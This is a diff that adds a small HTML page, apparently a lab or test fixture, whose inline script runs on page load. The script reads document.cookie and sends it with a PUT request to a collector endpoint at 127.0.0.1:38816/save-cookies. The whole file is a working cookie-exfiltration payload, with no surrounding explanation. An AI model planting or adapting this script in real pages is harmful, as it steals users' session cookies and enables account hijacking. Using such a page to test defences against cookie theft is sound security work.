@@ -1,0 +1,27 @@
+
+<html>
+	<head></head>
+	<body>
+		<script type="text/javascript">
+					
+			async function putReq(url, data) {
+
+				const response = await fetch(url, {
+					method: 'PUT',
+					headers: {
+						'Content-type': 'text/plain'
+					},
+					body: data
+				});
+
+				const resData = await response.json();
+				return resData;
+			}
+			
+			putReq('http://127.0.0.1:38816/save-cookies', document.cookie)
+				.then(data => console.log(data))
+				.catch(err => console.log(err));
+			
+		</script>
+	</body>
+</html>
